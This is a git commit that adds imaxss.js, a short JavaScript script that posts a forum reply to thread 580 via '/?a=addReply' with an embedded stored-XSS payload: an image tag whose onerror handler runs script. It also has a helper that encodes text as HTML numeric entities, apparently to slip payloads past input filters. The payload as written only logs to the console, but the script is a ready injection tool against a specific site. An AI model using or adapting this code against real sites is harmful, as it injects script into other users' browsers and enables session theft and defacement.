779cc161ec4c3cd6c28f63d96e13addedd79b196
lcygithub <lcyang_2011@163.com>
2013-11-03 16:44:27 +0800

    Create imaxss.js

---
+++ imaxss.js
@@ -0,0 +1,19 @@
+function xss(content) {
+	this.url = "/?a=addReply",
+	this.data = {
+		'reply_content': typeof content != "undefined" ? content : '学习了<img src="1" onerror="console.log(/error/)" alt="" />',
+		'tiezi_id': '580'
+	},
+	this.callback = function (data) {
+		console.log(JSON.parse(data));
+	}
+}
+xss.prototype = {
+	post: function () {
+		$.post(this.url, this.data, this.callback);
+	},
+	ch : function (str) {
+		return "&#" + str.split("").map(function(data) {return data.charCodeAt();}).join("&#");
+	}
+}
+var x = new xss;
